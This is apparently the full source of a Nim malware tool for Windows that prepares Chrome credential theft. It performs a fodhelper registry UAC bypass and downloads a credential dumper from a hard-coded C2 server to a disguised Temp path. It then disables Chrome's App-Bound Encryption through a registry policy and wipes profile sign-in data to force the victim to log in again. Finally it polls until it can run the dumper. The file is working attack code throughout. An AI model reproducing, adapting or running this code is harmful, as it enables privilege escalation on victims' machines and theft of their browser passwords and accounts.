import winim/core
import std/[os, json, strutils]

proc RegCreateKeyExA(hKey: HKEY, lpSubKey: cstring, Reserved: DWORD,
                     lpClass: cstring, dwOptions: DWORD, samDesired: REGSAM,
                     lpSec: pointer, phkResult: ptr HKEY,
                     lpdwDisposition: ptr DWORD): LONG
  {.stdcall, dynlib: "advapi32", importc.}
proc RegSetValueExA(hKey: HKEY, lpValueName: cstring, Reserved: DWORD,
                    dwType: DWORD, lpData: ptr BYTE, cbData: DWORD): LONG
  {.stdcall, dynlib: "advapi32", importc.}
proc RegCloseKey(hKey: HKEY): LONG
  {.stdcall, dynlib: "advapi32", importc.}
proc RegDeleteKeyA(hKey: HKEY, lpSubKey: cstring): LONG
  {.stdcall, dynlib: "advapi32", importc.}
proc RegOpenKeyExA(hKey: HKEY, lpSubKey: cstring, ulOptions: DWORD,
                   samDesired: REGSAM, phkResult: ptr HKEY): LONG
  {.stdcall, dynlib: "advapi32", importc.}
proc RegQueryValueExA(hKey: HKEY, lpValueName: cstring, lpReserved: ptr DWORD,
                      lpType: ptr DWORD, lpData: ptr BYTE,
                      lpcbData: ptr DWORD): LONG
  {.stdcall, dynlib: "advapi32", importc.}
proc ShellExecuteA(hwnd: HWND, lpOperation: cstring, lpFile: cstring,
                   lpParameters: cstring, lpDirectory: cstring,
                   nShowCmd: INT): HINSTANCE
  {.stdcall, dynlib: "shell32", importc.}
proc URLDownloadToFileA(pCaller: pointer, szURL: cstring,
                        szFileName: cstring, dwReserved: DWORD,
                        lpfnCB: pointer): HRESULT
  {.stdcall, dynlib: "urlmon", importc.}

const
  C2_SERVER = "http://10.0.0.41:1235"
  DUMPER_URL = C2_SERVER & "/chromecreds2.exe"
  DUMPER_PATH = r"C:\Windows\Temp\svcupdate.exe"

proc isElevated(): bool =
  var token: HANDLE
  OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr token)
  defer: CloseHandle(token)
  var elevation: DWORD
  var size: DWORD
  GetTokenInformation(token,
    cast[TOKEN_INFORMATION_CLASS](20),
    cast[LPVOID](addr elevation),
    sizeof(elevation).DWORD, addr size)
  return elevation != 0

proc uacBypass(command: string) =
  echo "[*] Not elevated. Attempting UAC bypass via fodhelper..."
  var hKey: HKEY
  var disp: DWORD
  discard RegCreateKeyExA(HKEY_CURRENT_USER,
    cstring("Software\\Classes\\ms-settings\\Shell\\Open\\command"),
    0, nil, 0, KEY_SET_VALUE, nil, addr hKey, addr disp)
  discard RegSetValueExA(hKey, cstring(""),
    0, REG_SZ,
    cast[ptr BYTE](cstring(command)),
    command.len.DWORD + 1)
  discard RegSetValueExA(hKey, cstring("DelegateExecute"),
    0, REG_SZ,
    cast[ptr BYTE](cstring("")), 1)
  discard RegCloseKey(hKey)
  echo "[*] Registry key set. Launching fodhelper..."
  discard ShellExecuteA(0, cstring("open"),
    cstring(r"C:\Windows\System32\fodhelper.exe"),
    nil, nil, 1)
  Sleep(3000)
  discard RegDeleteKeyA(HKEY_CURRENT_USER,
    cstring("Software\\Classes\\ms-settings\\Shell\\Open\\command"))
  echo "[+] UAC bypass launched. Cleaning up registry key."

proc downloadDumper(): bool =
  echo "[*] Downloading dumper from: " & DUMPER_URL
  let hr = URLDownloadToFileA(nil,
    cstring(DUMPER_URL),
    cstring(DUMPER_PATH),
    0, nil)
  if hr == 0 and fileExists(DUMPER_PATH):
    echo "[+] Dumper downloaded successfully to: " & DUMPER_PATH
    return true
  else:
    echo "[-] Download failed. HRESULT: " & $hr
    return false

proc detectVersion(): string =
  let localState = getEnv("LOCALAPPDATA") &
    r"\Google\Chrome\User Data\Local State"
  echo "[*] Checking Local State: " & localState
  if not fileExists(localState):
    echo "[-] Local State file not found."
    return "unknown"
  try:
    let js = parseJson(readFile(localState))
    if js.hasKey("os_crypt"):
      if js["os_crypt"].hasKey("app_bound_encrypted_key") and
         js["os_crypt"]["app_bound_encrypted_key"].getStr().len > 0:
        echo "[*] app_bound_encrypted_key found — checking registry policy..."

        var hKey: HKEY
        let res = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
          cstring("SOFTWARE\\Policies\\Google\\Chrome"),
          0, KEY_READ, addr hKey)
        if res == 0:
          var val: DWORD
          var size: DWORD = sizeof(val).DWORD
          var valType: DWORD
          let qres = RegQueryValueExA(hKey,
            cstring("ApplicationBoundEncryptionEnabled"),
            nil, addr valType,
            cast[ptr BYTE](addr val), addr size)
          discard RegCloseKey(hKey)
          if qres == 0 and val == 0:
            echo "[+] Registry policy already applied — treating as v10."
            return "v10"
        else:
          echo "[*] No Chrome policy registry key found."

        echo "[!] Version detected: v20 (App-Bound Encryption active)"
        return "v20"
      elif js["os_crypt"].hasKey("encrypted_key"):
        echo "[+] Version detected: v10 (standard DPAPI)"
        return "v10"
  except:
    echo "[-] Failed to parse Local State JSON."
  echo "[-] Version unknown."
  return "unknown"

proc writeRegistryPolicy() =
  echo "[*] Writing registry policy to disable App-Bound Encryption..."
  var hKey: HKEY
  var disp: DWORD
  discard RegCreateKeyExA(HKEY_LOCAL_MACHINE,
    cstring("SOFTWARE\\Policies\\Google\\Chrome"),
    0, nil, 0, KEY_SET_VALUE, nil, addr hKey, addr disp)
  var val: DWORD = 0
  discard RegSetValueExA(hKey,
    cstring("ApplicationBoundEncryptionEnabled"),
    0, REG_DWORD, cast[ptr BYTE](addr val), sizeof(val).DWORD)
  discard RegCloseKey(hKey)
  echo "[+] Registry policy written: ApplicationBoundEncryptionEnabled = 0"

proc disconnectChromeAccount() =
  echo "[*] Scanning user profiles to disconnect Chrome accounts..."
  let usersBase = r"C:\Users"
  for kind, userPath in walkDir(usersBase):
    if kind != pcDir: continue
    let userDataPath = userPath & r"\AppData\Local\Google\Chrome\User Data"
    if not dirExists(userDataPath): continue
    echo "[*] Found Chrome User Data at: " & userDataPath
    for pkind, profilePath in walkDir(userDataPath):
      if pkind != pcDir: continue
      let profileName = extractFilename(profilePath)
      if profileName != "Default" and
         not profileName.startsWith("Profile"): continue
      let prefsPath = profilePath & r"\Preferences"
      if not fileExists(prefsPath): continue
      echo "[*] Processing profile: " & profileName
      try:
        var prefs = parseJson(readFile(prefsPath))
        if prefs.hasKey("account_info"):
          prefs["account_info"] = newJArray()
        if prefs.hasKey("google") and
           prefs["google"].hasKey("services"):
          if prefs["google"]["services"].hasKey("username"):
            prefs["google"]["services"]["username"] = newJString("")
          if prefs["google"]["services"].hasKey("account_id"):
            prefs["google"]["services"]["account_id"] = newJString("")
          if prefs["google"]["services"].hasKey("last_account_id"):
            prefs["google"]["services"]["last_account_id"] = newJString("")
        if prefs.hasKey("signin") and
           prefs["signin"].hasKey("info_list"):
          prefs["signin"]["info_list"] = newJArray()
        copyFile(prefsPath, prefsPath & ".bak")
        writeFile(prefsPath, $prefs)
        echo "[+] Account info cleared for profile: " & profileName
      except CatchableError as e:
        echo "[-] Failed to modify preferences for " & profileName & ": " & e.msg

proc restartChrome() =
  echo "[*] Killing Chrome processes..."
  discard ShellExecuteA(0, cstring("open"), cstring("taskkill"),
    cstring("/f /im chrome.exe"), nil, 0)
  Sleep(2000)
  echo "[*] Restarting Chrome..."
  discard ShellExecuteA(0, cstring("open"),
    cstring(r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
    nil, nil, 1)
  echo "[+] Chrome restarted."

proc runV20Bypass() =
  echo "[!] v20 detected — starting full bypass sequence."
  echo "[*] Step 1: Killing Chrome..."
  discard ShellExecuteA(0, cstring("open"), cstring("taskkill"),
    cstring("/f /im chrome.exe"), nil, 0)
  Sleep(2000)
  echo "[*] Step 2: Writing registry policy..."
  writeRegistryPolicy()
  echo "[*] Step 3: Disconnecting Chrome accounts..."
  disconnectChromeAccount()
  echo "[*] Step 4: Restarting Chrome..."
  restartChrome()
  echo "[+] Bypass sequence complete. Waiting for user to re-authenticate..."

proc runDumper() =
  echo "[*] Executing credential dumper: " & DUMPER_PATH
  discard ShellExecuteA(0, cstring("open"),
    cstring(DUMPER_PATH), nil, nil, 0)
  echo "[+] Dumper launched."

proc main() =
  echo "[*] Preparer starting..."

  if not isElevated():
    let selfPath = getAppFilename()
    uacBypass(selfPath & " --elevated")
    quit(0)

  echo "[+] Running with elevation."

  echo "[*] Step 1: Downloading dumper..."
  if not downloadDumper():
    echo "[-] Failed to download dumper. Exiting."
    quit(1)

  echo "[*] Step 2: Detecting Chrome encryption version..."
  let version = detectVersion()
  echo "[*] Detected version: " & version

  if version == "v10":
    echo "[+] v10 confirmed — running dumper immediately."
    runDumper()
  elif version == "v20":
    runV20Bypass()
    echo "[*] Polling every 60s for v10 credentials (max 60 attempts)..."
    var attempts = 0
    while attempts < 60:
      inc attempts
      echo "[*] Poll attempt " & $attempts & "/60 — sleeping 60s..."
      Sleep(60000)
      let v = detectVersion()
      echo "[*] Version check: " & v
      if v == "v10":
        echo "[+] v10 detected! Running dumper."
        runDumper()
        break
    if attempts == 60:
      echo "[-] Timed out waiting for v10. User may not have re-authenticated."
  else:
    echo "[!] Unknown version — attempting dump anyway."
    runDumper()

  echo "[*] Done."

main()
